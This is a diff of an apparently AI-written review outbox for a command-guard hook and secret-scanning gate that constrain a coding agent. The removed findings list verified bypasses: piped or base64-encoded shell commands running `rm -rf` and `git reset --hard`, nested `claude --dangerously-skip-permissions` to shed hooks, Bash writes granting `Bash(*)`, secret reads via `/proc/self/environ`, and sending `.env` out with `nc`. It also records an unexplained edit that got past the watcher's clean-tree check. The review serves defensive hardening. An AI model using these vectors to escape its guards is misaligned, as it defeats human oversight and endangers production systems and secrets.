+- **D-19 remains empirical**; **D-14's durable fix** (external workspaces + watcher unit change +
+  precondition-failure classification) is deferred to a separately reviewed round, as the inbox
+  directed. **The two layout skips remain skips** until the owner applies `.claude/`.
+- Reviewer independence: implementer and reviewer are the same model family on the same account;
+  the pilot's reviewer-identity field should record this again for the fresh review.
 
-**D-04 (H) Text fed to a shell by pipe, here-string or prose heredoc is not evaluated.** `PIPE-TO-SHELL`
-fires only when the left side is `curl|wget|fetch`; `_shell_dash_c` without `-c` allows; `_heredoc_owner`
-classifies `cat <<EOF | bash` as prose because it only looks left of `<<`. Verified ALLOW:
-`printf 'git reset --hard' | sh`; `echo 'git reset --hard' | bash`; `bash <<< 'git reset --hard'`;
-`cat <<EOF | bash` (body `git reset --hard`); `cat <<'EOF' | sh` (body `rm -rf /opt/crooks-os`);
-`echo Z2l0IHJlc2V0IC0taGFyZA== | base64 -d | sh`. (`bash -s <<EOF` and `sh -c '…'` are caught.)
-*Repair:* a shell that is the right-hand side of a pipe, or has a `<<<` operand, or has no script/`-c`
-argument, is denied `UNPARSEABLE` unless the left-hand segment is a literal `echo`/`printf` whose text is
-then evaluated; and `_heredoc_owner` must look at the whole line (any `| sh|bash` after the operator = shell).
+## 9. Decisions or questions needing review
 
-**D-05 (M) `GIT_DIR`/`GIT_WORK_TREE` prefixes reach production.** Leading assignments are discarded by
-`_tokens` and `_unwrap("env")`. Verified ALLOW: `GIT_DIR=/opt/crooks-os/.git git fetch origin`;
-`env GIT_DIR=/opt/crooks-os/.git git fetch`. *Repair:* run `_protected_hit` over every dropped
-`NAME=value` value; treat `GIT_DIR`/`GIT_WORK_TREE`/`GIT_COMMON_DIR` values as git global-option paths.
+1. **Accept `d7911b2…` as the new review candidate and commission a fresh independent adversarial
+   review of it** (pilot §5: corrections create a new candidate; the previous review bound only
+   `dd50ebb…`). Suggested focus for the reviewer, beyond re-attacking every D-id: the new
+   `_segments` substitution marker, `_shell_texts`/`_fed_text`, `_brace_alternatives`, `_cd_rule`
+   resolution of relative deletes, the D-13 `/etc`+`/root` widening for dangerous false
+   positives, and whether the gate's UNPARSEABLE-on-laundering is the right contract for a gate
+   that "does nothing for any other command".
+2. D-13 breadth: the general rule landed as two constants; confirm that is the intended scope
+   decision, or ask for the narrower CROOKS-only form back.
+3. The `eval "$(…)"` idiom change in `CLAUDE.md`/`DEV_ENVIRONMENT.md` (and whether
+   `scripts/dev_env.py`'s printed hint should follow in a later, non-security round).
+4. Guard size (2,024 lines): whether the §5F split into core + advisory tables and a finite
+   command-word allow-list becomes its own design round. Not attempted here, per the inbox.
+5. D-14: nothing for this round; the owner still holds the local exclude entry and the later
+   watcher/systemd hardening decision.
 
-**D-06 (M) `git -c core.hooksPath=/tmp/h commit -m x` → ALLOW.** `_git_subcommand` skips `-c` and its
-value without recording it, so the `GIT-CONFIG-HOOKSPATH` rule is one flag away. *Repair:* collect `-c`
-values and deny when any starts with `core.hookspath=` (case-insensitive).
+## 10. Exact proposed next step
 
-**D-07 (M) Nested `claude` escapes the harness.** `_claude_rule` inspects only `mcp|plugin|config|install…`
-subcommands. Verified ALLOW: `claude -p 'x' --dangerously-skip-permissions`;
-`claude --permission-mode bypassPermissions -p x`; `claude --bare -p x`; `claude --mcp-config /tmp/m.json -p x`.
-A child session started this way runs with a different permission mode, different setting sources and
-(with `--bare`) **no hooks**. *Repair:* deny `claude` when any argument is in
-`{--dangerously-skip-permissions, --permission-mode, --bare, --setting-sources, --mcp-config, --plugin-dir, -p, --print}`.
+An independent, read-only, adversarial review round of `claude/harness-hooks-experiment` at exact
+head `d7911b24979be2306749b7333ec60edc28cba857`, exact parent `dd50ebbca6eca9c4e2ee1e85ad17d2c7e5afd25e`,
+accepted base `295e483b4f9adcdc3fb58bfb3aa025e2e3f4779b`: verify the two-commit identity, re-run
+`tests/test_harness_review_repairs.py` (181), the targeted set (568 + 2 skips), the offline suite
+(3374 + 10 skips), Ruff and the range scan; re-attack the repaired rules with vectors not in this
+file; return exactly one verdict. No `.claude/` apply, no merge, no unit/exclude/identity change
+until that verdict. Separately and only by the owner: the D-19 live init-line capture and the
+D-14 watcher hardening remain open.
 
-**D-08 (M) The project's own `.claude/` is writable through Bash.** `/root/.claude` is protected;
-`<project>/.claude/` is not. Verified ALLOW: `echo '{"permissions":{"allow":["Bash(*)"]}}' > .claude/settings.local.json`
-(relative and absolute), `cp /tmp/x /opt/crooks-builder/.claude/settings.json`, `sed -i … .claude/settings.json`.
-The pending `settings.json` is what registers the guard; a Bash write can unregister it or grant permissions.
-Whether Claude Code's own "sensitive file" check also covers Bash writes is **unverified** (I did not attempt
-one). *Repair:* treat any path with a `.claude` component, and any `.git/hooks/` path, as write-protected
-(reads allowed), same shape as `.git`/`.worktrees` in `_delete_target_problem`.
+## 11. Stop
 
-**D-09 (M) Joined short options defeat two rules.** `curl -XPOST https://api.example.invalid/x` → ALLOW
-(`-X` matched only as a separate token); `apt-get -y install jq` and `apt -y install jq` → ALLOW (the verb
-finder skips only `--long` options, so `-y` becomes the "verb"). *Repair:* match `-X…`/`-d…` prefixes;
-skip every `-`-prefixed token when locating the package verb.
+Repair candidate published and read back. Nothing merged, deployed, installed, started or
+approved by this round.
 
-**D-10 (M) Path spellings the normaliser does not see.** Brace expansion: `cp x /opt/{crooks-os,y}/` and
-`echo x | tee /opt/crooks-o{s,}/f` → ALLOW (`{` is not in `GLOB_CHARS`). Relative `cd` chains:
-`cd /opt; cd crooks-os; git pull` → ALLOW and `cd /opt/crooks-os; cd /tmp; cd -; git pull` → ALLOW
-(only absolute/`~` targets update `protected_cwd`). `echo /opt/crooks-os | xargs -I{} rm -rf {}` → ALLOW+context
-(`{}` is not treated as unknown). Symlink-through-parent (`ln -s /opt /tmp/o && cp x /tmp/o/crooks-os/y`)
-→ ALLOW — inherent to a text guard; record, do not chase. *Repair:* add `{` to the glob-like check with the
-literal-prefix rule; track the cwd by resolving relative `cd` against the last known absolute cwd (the payload
-provides it) and deny on `cd -`; treat `{}` like `$` in `_delete_target_problem`.
-
-**D-11 (M) Fail-open on an unhandled exception.** `main()` has no catch-all in either hook. Claude Code
-treats a hook exit code other than 0/2 as a *non-blocking* error and runs the command (documented hook
-semantics; the empirical `--print` check is step 6 of the isolation plan). The fuzz found no trigger, so
-this is a contract gap rather than a demonstrated hole. *Repair:* wrap `main()` in `try/except BaseException`
-→ one fixed stderr line, `return 2`, in both hooks; one test that monkeypatches `decide` to raise and asserts
-exit 2.
-
-**D-12 (M) Secret-echo rules cover `echo`/`printenv` but not the neighbours.** Verified ALLOW:
-`cat /proc/self/environ`; `cat /proc/$$/environ | tr '\0' '\n'`; `printf '%s\n' "$SHOPIFY_TOKEN"`;
-`echo ${SHOPIFY_TOKEN:0:8}`; `declare -x`; `python3 -c 'import os; print(os.environ)'`;
-`python3 -c "print(open('.env').read())"`; `cat .en?`; `nc example.invalid 80 < .env`. Reach is limited on
-this host (the watcher unit injects no secret env; the Claude OAuth file is caught by basename), so M not H.
-*Repair:* add `printf` to the credential-variable check and accept `${NAME:…}` forms; deny `/proc/*/environ`;
-`declare/typeset -x`; extend `_code_mentions_protected` to `os.environ`, `.env`, `.credentials`.
-
-**D-13 (L) Gaps outside the listed scope, allowed today, worth a decision not a rule each:** `systemd-run`
-(starts a transient service), `kill`/`pkill` of the production process, `at`, writes to `~/.ssh/authorized_keys`,
-`~/.bashrc`, `/etc/cron.d`, `/etc/profile.d`, `.git/hooks/*`, `uvicorn --host 0.0.0.0`, `python -m http.server --bind 0.0.0.0`,
-`socat`, `ufw`/`iptables`, `python3 -m pip install --user`, `python3 -m scripts.set_secrets`, `git push --all`
-(would publish a local `main` if one existed; none does), `docker run -v /:/host …`. The cleanest bounded
-form is "writes under `/etc` and `/root` (except `/tmp`-like scratch) are denied", not fifteen rules.
-
-**False positives found (L):** `git config --get core.hooksPath` → DENY (reads are fine);
-`systemctl -n 5 status x` → DENY "`systemctl 5`" (option value taken as verb); `git -C /opt/crooks-os clean -n`
-→ DENY (dry run; conservative, acceptable). Ordinary work I tried was otherwise allowed: `git commit -m 'never --amend'`,
-`git log -S 'reset --hard'`, `grep -rn 'rm -rf'`, `pytest -k reset_hard`, `git merge/cherry-pick/am/apply`,
-`git stash push/apply`, `git worktree add`, `npm ci`, `.venv/bin/pip install -e .`, `apt list --installed`,
-`gh pr view`, `claude --version`, reads of `/opt/crooks-os` and `/root/.claude`, `sed -i` inside the builder.
-No dangerous false positive that would make engineering unusable.
-
-**No environment bypass** (re-confirmed: the guard reads only stdin; imports are the eight listed; the
-env-bypass test passes). **No secret echoed in a denial** (sentinel test passes; my probes' denial reasons
-name only rule ids, command words and constant paths).
-
-### 5B `gitleaks_gate.py` (inbox item 3)
-
-**D-15 (M→H with D-03/D-04) The gate misses every laundered publish, plus `bash -c`.** `_publish_actions`
-unwraps `PASSTHROUGH` wrappers but not shells: verified `bash -c 'git push origin x'` → `[]` (no scan),
-and likewise `eval 'git push …'`, `G=git; $G push …`, `cat <<EOF | bash` → `[]`. The guard still applies its
-destructive rules to `bash -c`, but the *secret scan* does not run. *Repair:* in `_publish_actions`, recurse
-into `-c` strings and `<<<` operands the same way the guard does; D-03/D-04 repairs close the rest.
-
-**D-16 (L, fail-closed false positive) `git commit -C <commit>` is misread as `git -C <path>`.** The `-C`
-scan runs over all tokens, so `git commit -C HEAD` sets `c_path="HEAD"`; verified in a temp repo →
-`GITLEAKS-ERROR` deny. *Repair:* only inspect tokens before the subcommand index (`len(toks)-len(rest)-1`).
-
-**D-17 (M) Time budget can exceed the registered hook timeout.** A commit with `-a`/pathspecs runs two
-scans, each `SCAN_TIMEOUT_S = 90`; the pending `settings.json` gives the gate 120 s. If the sum is exceeded,
-Claude Code kills the hook and (non-blocking error) the commit proceeds unscanned. On this repo scans take
-seconds, so this is latent. *Repair:* one shared deadline across scans (e.g. 100 s total), or register 200 s.
-
-Sound: detection of `commit`/`push` behind `sudo/env/timeout`, separators and shell heredocs; the
-`--all --not --remotes` push scope (re-verified: unpushed leak denies, published history passes); commit from
-a **subdirectory** of the repo works (verified); protected-checkout refusal before any scan; missing binary
-→ deny; non-0/1 exit → deny; unreadable report → deny; `--redact`, stdout/stderr to `/dev/null`, only
-`RuleID`/`File`/`StartLine`/`Commit[:7]` read, first 20 findings; the synthetic token never appears in output
-(test re-run passes). Pinned binary resolved by path, then PATH; no variable.
-
-### 5C `roster_assert.py` + `WORKER_TOOL_SURFACE_ISOLATION.md` (inbox item 4)
-
-The code does what it says on the documented shape and fails closed on missing/mistyped `tools`,
-non-object messages and wrong `permissionMode` (tests pass; I re-read every branch). It is **not sufficient
-to prove absence of inherited MCP/plugin surface**, for four reasons that must be verified empirically
-before any watcher integration:
-
-**D-18 (M) Unknown roster keys are ignored, not failed.** Only `tools`, `mcp_servers`, `slash_commands`,
-`permissionMode` are examined. Recent Claude Code init messages may carry `agents`, `skills`, `plugins`,
-`output_style` and version fields; a plugin surface exposed under any key the code does not know passes as
-"roster OK". Plugin detection relies on a `:` in a slash-command name — an assumption. *Repair:* require the
-known key set explicitly and treat any additional list-valued key as a violation ("undocumented evidence is
-UNKNOWN"); include `slash_commands` in the digest.
-
-**D-19 (M) Deferred tools.** In the very session that produced this review, the account's MCP tools were
-presented as *deferred* tools reachable through `ToolSearch`, not as first-class entries. If the init `tools`
-list omits deferred tools, `mcp__*` absence proves nothing; the strict allow-list would still catch `ToolSearch`
-itself (a good fail-closed property) — but that means a "clean" roster is unreachable while `ToolSearch`,
-`Skill`, `Agent`, `Workflow` exist in the roster, and the doc itself says `--disallowed-tools` may only deny
-rather than remove. The assertion could therefore be permanently red under layer 1 alone, forcing layer 2
-(dedicated identity). This is the decisive empirical question; the doc names `--strict-mcp-config` as decisive
-instead. Both are.
-
-**D-20 (L) It is a kill switch, not a gate.** The init line is emitted after the session — and its tools —
-exist; the watcher would TERM a violating session milliseconds later. "Before the model has produced a
-single token of work" is not guaranteed; a first tool call could race the reader. Fine as a backstop; the
-gate is the launch configuration, and the doc should say so.
-
-**Explicitly flagged as requiring empirical verification before watcher integration:** init field names and
-types; whether `--strict-mcp-config` drops account connectors; whether `--disallowed-tools` removes or only
-denies; whether `--disable-slash-commands` removes project skills; whether `--permission-prompts none` denies
-rather than stalls; whether project hooks run under `--print`; whether hook non-0/2 exit and timeout are
-non-blocking (D-11, D-17). Every one launches a session under the owner's account → owner-approved live
-check (isolation doc §5 already says so). The `--bare` note is right: it would drop the hooks.
-
-### 5D `.gitignore`, root `CLAUDE.md`, `PROJECT_CLAUDE_FILES_PENDING.md` (inbox item 5)
-
-- `.gitignore`: `.claude/*` + `!.claude/rules/`, `!.claude/skills/`, `!.claude/settings.json`,
-  `.claude/settings.local.json`, `.worktrees/` — correct allowlist form (a re-included directory under a
-  `dir/*` exclusion works; under `dir/` it would not). `test_project_claude_layout.py` holds it. Sound.
-- Pending `.claude/settings.json` (§2 of the pending doc): one `PreToolUse` entry, matcher `Bash`, two
-  `command` hooks by `$CLAUDE_PROJECT_DIR`-relative path, timeouts 15/120 s, **no** `permissions`, `env`,
-  `model`, `plugins`, other events, network or ECC runtime. Confirmed by reading; the layout test enforces
-  it once the file exists. One consequence not stated anywhere: hooks are loaded from the directory Claude is
-  **launched in** (`/opt/crooks-builder`, branch `claude/builder-environment-repair`), so applying the files
-  on the candidate branch activates nothing for the bridge until the candidate's tree is what the builder has
-  checked out. Also (D-08) the registration file is Bash-writable by the worker it governs.
-- Skill provenance/narrowing plan: the pending `SKILL.md` = upstream with one frontmatter line changed
-  (`tools: Read, Grep, Glob`), `LICENSE` MIT, `PROVENANCE.md` with commit + sha256 + update policy; scanned
-  twice at 0 issues. The plan is static and sound; the bytes themselves are not in the candidate, so the
-  layout test correctly skips. Upstream digests not re-verified here (no ECC fetch).
-- Root `CLAUDE.md`: 40 lines, points rather than contains, states the invariants and the builder/production
-  rule, says plainly that hooks are inactive without `.claude/`. Nit: "~2800 tests" is stale once the candidate
-  lands (3193).
-
-### 5E `.worktrees/` under the builder (inbox item 7)
-
-**D-14 (M, process) It did break the accepted clean-builder precondition, and the fix that unblocked this
-round is unversioned and unrecorded.** The watcher's `tree_is_dirty` uses `status --porcelain=v1 --untracked-files=all`.
-The journal shows the watcher **refusing to start this review round eight times** — 18:36:28, 18:37:29,
-18:39:29, 18:43:30, 18:51:30, 19:06:31, 19:21:32, 19:36:32 UTC, "REFUSING to start — /opt/crooks-builder has
-uncommitted changes", inbox `2b1030bd…` left UNPROCESSED — from the moment the implementer's worktree existed.
-At **19:47:45 UTC** `/opt/crooks-builder/.git/info/exclude` was modified to add `.worktrees/` (line 7; the
-implementer's outbox explicitly says it did not touch this file, and its round ended 17:41), and the service
-was restarted at 19:50:32, after which this round started. Consequences: (1) the builder's "clean" state now
-depends on a per-clone, unversioned, unreviewed local file that no test or doc records; (2) a fresh builder
-clone would hit the same eight-retry stall on the first candidate worktree; (3) the candidate's `.gitignore`
-line fixes it only once that `.gitignore` is on the builder's checked-out branch. Not cleaned, not removed.
-*Design correction needed (owner/Director choice):* either land the one-line `.worktrees/` ignore on the base
-branch ahead of any candidate (a separate one-line commit on `claude/builder-environment-repair`), or
-record the `info/exclude` entry as part of the builder install/upgrade script and its 126-test suite, and
-say which in `DEV_ENVIRONMENT.md`. Worktrees cannot simply move outside `/opt/crooks-builder`: the watcher
-unit's `ReadWritePaths=/opt/crooks-builder` under `ProtectSystem=strict` would make them read-only.
-
-### 5F Size vs the reuse plan (inbox item 8)
-
-1,340 lines split roughly: ≈330 lexer/segmenter/heredoc/paths, ≈120 constants, ≈220 git, ≈110 rm/find,
-≈500 across eleven further rule families (services, tailscale, make, scripts, gh, claude, packages, disk,
-secrets, interpreters, network), ≈60 entry/IO. The reuse plan asked for "a small fail-closed CROOKS project
-hook" and "a small typed decision table and exhaustive negative tests". My assessment: size is not itself
-the defect, but it is *where* the defects came from. Every rule family carries its own read-only exemptions
-and option parsers, and D-01, D-02, D-09 and D-16 are each an exemption or parser that was one case too
-generous; D-03/D-04 are the one lexer fact ("unknown command words are allowed") that the 60 rule ids
-obscure. The 1,340 lines materially harm auditability in one specific way: a reviewer cannot enumerate the
-allow-set, only the deny-set. Recommendation for the repair round, not a precondition: keep the input
-contract, the lexer and the git/rm/find/path/ref/service/tailscale/secret/live/deploy/pipe-to-shell tables;
-move the `gh`, package, disk, keyring/security and network-method families to a separate "advisory"
-table or drop them; make the command-word rule fail-closed (D-03) so the allow-set is finite. Target under
-≈800 lines with more negative tests, not fewer.
-
-## 6. What is sound (so the repair is bounded)
-
-The fail-closed **input** contract (empty/oversized/non-JSON/non-object/non-Bash/non-string/unbalanced
-→ exit 2, empty stdout; 15 malformed payloads pass in-process and as a subprocess); no environment or file
-influence; stdlib-only; denial reasons never echo the command; `additionalContext` only, never a
-`permissionDecision`; the ported ECC destructive-git table (all 40 + 25 + 33 vectors re-run, plus my own:
-`+refspec`, lease-to-shared, `--repo`, URL remotes, quoted/split refspecs, `checkout <ref> -- file`,
-`restore --source`, line continuations, `\git`, `command git`, full-path git, function-then-call,
-`env -i`, `timeout -k`, `find -exec`, `sh -c`, `bash -lc`, shell heredocs, `$(…)` in double quotes and
-unquoted heredocs); protected-cwd tracking for absolute `cd`; redirection into protected paths including
-`2>`, `&>`, `exec 3>`; `cp/rsync/install/dd of=` into protected paths; globs that could expand into them;
-interpreter inline code / code heredocs that name them; the recursive-delete scoping rule. The tests are
-real, named after defects, and the two skips say so. The docs do not overclaim: "a Bash-text hook is a
-nudge, not a boundary" is in the guard's own docstring, and it is true.
-
-## 7. Production, services, account, connectors — unchanged (inbox item 9)
-
-**Production branch HEAD: `1cf3a0f3361b79f9de208d80f501543c53c244b5` — unchanged, clean (0 status lines),
-never entered except `git rev-parse`/`status` from outside.** `crooks-assistant.service`,
-`crooks-bridge-watcher.service`, `tailscaled.service`: active/enabled (read-only `is-active`/`is-enabled`).
-Listeners (`ss -ltnp`): `127.0.0.1:8000` python (assistant), sshd 22, tailscaled 443 on the two tailnet
-addresses only; nothing on `0.0.0.0:8000`. `/health` not called. `/root/.claude/settings.json` mtime
-2026-09-18 16:29 (unchanged); `/root/.claude` writable and not modified by me; `/root/.claude.json` mtime
-19:50:36 = this session's own launch by Claude Code, not a configuration change. No `claude config/mcp/plugin`,
-no unit, Tailscale, secret, permission, connector or business-tool call. Network use: `git ls-remote` (twice)
-and one `git fetch origin claude/product-memory-foundation` — reads only; no push, no ECC fetch. Scratch:
-`/tmp/guard_probe.py` and `/tmp/review-suite.log` (no secrets) inside the watcher's `PrivateTmp`; they
-vanish when the service restarts — which is also why the previous round's "`/tmp/harness-suite.log` remains"
-is no longer true. The gitleaks JSON report was deleted after counting.
-
-## 8. Safety constraints — all preserved
-
-`writes_enabled` false; `CROOKS_WRITES_LOCAL_OWNER` false; FastAPI on 127.0.0.1; port 8000 not public;
-proposal/action/verification semantics untouched (no code changed anywhere); no live Shopify, Gmail or
-ElevenLabs call; no external mutation; V2 not begun; UI untouched; Mac deployment/rollback untouched;
-`/root/.claude` writable and unmodified; no secret value read, printed or written (secret file **names**
-appear in D-01 because the finding is about them; their contents were never opened); nothing installed,
-started, merged, pushed, reset, cleaned, stashed or deleted; no `.claude/` file created; no candidate
-created; no permission widened; nothing outside `bridge/claude-outbox.md` touched in the bridge.
-
-## 9. Errors, limits and things to know
-
-- The builder's `origin/claude/product-memory-foundation` tracking ref is stale (`b5c94fd8…`, lacks
-  CURRENT_TRUTH); the remote is at `59c5f677…`. I used `FETCH_HEAD`. Future rounds should fetch first.
-- Claude Code hook exit/timeout semantics (D-11, D-17) are stated from the documented behaviour, not
-  measured here; measuring them is the owner-approved step 6.
-- ECC digests not re-verified (no network fetch of ECC in a read-only review).
-- Reviewer independence: the implementer and I are the same model family on the same account; the
-  vectors are mine and none reuse the implementer's tables, but DEV_TEAM_V1_PILOT §5's "reviewer identity/
-  independence" field should record this.
-
-## 10. Decisions or questions needing review
-
-1. Accept the verdict shape: `REJECT — REPAIR REQUIRED` with D-01…D-20; the repair is a **new commit on the
-   same branch → new candidate SHA → fresh independent review** (pilot §5: corrections create a new candidate;
-   this review binds only `dd50ebb…`).
-2. D-13 scope: whether "no writes under `/etc` or `/root` beyond `/root/.claude`-style reads" becomes a rule,
-   or the guard stays narrowly CROOKS-specific. Reviewer recommendation: the general rule; it is shorter.
-3. D-14: which of the two `.worktrees/` corrections the owner wants, and that the 19:47:45 `info/exclude`
-   edit be acknowledged in the record (who, why) — it is currently invisible to Git and to the docs.
-4. D-19: whether layer 2 (dedicated engineering identity or API-key `--bare` with hooks re-registered another
-   way) is planned regardless, since layer 1 alone may be unable to produce a roster the assertion accepts.
-5. Tools narrowing `Read, Grep, Glob` vs `+Bash`: no objection to the narrower set.
-
-## 11. Smallest safe next step
-
-One implementation round on `claude/harness-hooks-experiment`, base `dd50ebb…`, one commit, no `.claude/`
-attempt: repair **D-01, D-02, D-03, D-04, D-05, D-06, D-07, D-08, D-09, D-11, D-15, D-16, D-17** and the
-`stash`/`-C`/`printf`/`declare -x`/`/proc/*/environ` cases of D-10/D-12, each with a failing-then-passing
-negative test (the exact command strings above are the tests); add the unknown-key rule to `roster_assert.py`
-(D-18) and the "kill switch, not gate" sentence to the isolation doc (D-20); re-run targeted + suite + ruff +
-gitleaks; push; then a fresh independent review of the new SHA. Separately and first, the owner decides
-D-14 so the builder's clean check stops depending on an unrecorded local file. Do not merge; do not touch
-the watcher unit; do not create `.claude/` files by any route the worker has already been refused.
-
-## 12. Stop
-
-Review complete. Nothing was implemented, committed or pushed by this round.
-
-Inbox SHA processed: `2b1030bd48ee14888e0c85b7d160fa39b2cba6eb`
+Inbox SHA processed: `4843e76fb5523a4486c1d275f67842d3ab567ef3`
